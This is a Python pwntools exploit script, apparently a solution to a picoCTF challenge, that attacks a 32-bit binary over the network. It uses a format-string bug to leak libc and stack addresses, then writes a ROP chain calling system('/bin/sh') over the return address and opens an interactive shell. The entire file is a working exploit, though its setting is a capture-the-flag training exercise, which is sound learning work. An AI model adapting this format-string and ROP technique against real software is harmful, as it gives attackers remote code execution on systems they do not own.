#!/usr/bin/env python3

from pwn import *
import os

# Need to chdir (instead of using ELF("./patched/vuln_patched") ) because
# pwninit hardcoded the interpreter of ./patched/vuln_patched to ./ld-2.27.so
os.chdir("./patched")

exe = ELF("vuln_patched")
libc = ELF("libc6-i386_2.27-3ubuntu1.6_amd64.so")
ld = ELF("ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 57529)

    return r


# Uses a (lexical) closure so that the lambda that sends the payload can use r and ans
def wrapper_send_payload(ans, r):
    def send_payload(payload):

        log.info(f"Format String payload: {payload}")

        r.sendlineafter(b'guess?\n', str(ans).encode())
        r.sendlineafter(b'Name? ', payload)

    return send_payload


def main():

    r = conn()

    # Found using guess_ans.py
    ans = -3727

    # Leak the libc base address
    r.sendlineafter(b'guess?\n', str(ans).encode())
    r.sendlineafter(b'Name? ', b'%8$s'+p32(exe.got.printf))
    libc.address = u32(r.recvuntil(b'\n\n')[10:14]) - libc.symbols.printf

    log.info(f"{hex(libc.address)=}")


    # Leak the ebp (of the stack frame of main) saved on the stack
    fmtstr_offset = 7

    r.sendlineafter(b'guess?\n', str(ans).encode())
    r.sendlineafter(b'Name? ', b'%' + str(fmtstr_offset + 0x20c//4).encode() + b'$p')
    ebp_main = int(r.recvuntil(b'\n\n')[12:].strip().decode(), 16)

    log.info(f"{hex(ebp_main)=}")


    # Create the ROP chain
    rop = ROP(libc)
    rop.system(next(libc.search(b"/bin/sh\x00")))

    log.info(f"ROP Chain:\n{rop.dump()}")


    # Write in the payload using FmtStr
    rop_chain = rop.chain()
    retaddr_win = ebp_main - 0x1c
    fmtstr = FmtStr(execute_fmt=wrapper_send_payload(ans, r), offset=fmtstr_offset)
    for i in range(len(rop_chain)//4):
        fmtstr.write(retaddr_win + i*4, u32(rop_chain[i*4:(i+1)*4]))
    fmtstr.execute_writes()
    
    r.interactive()


if __name__ == "__main__":
    main()
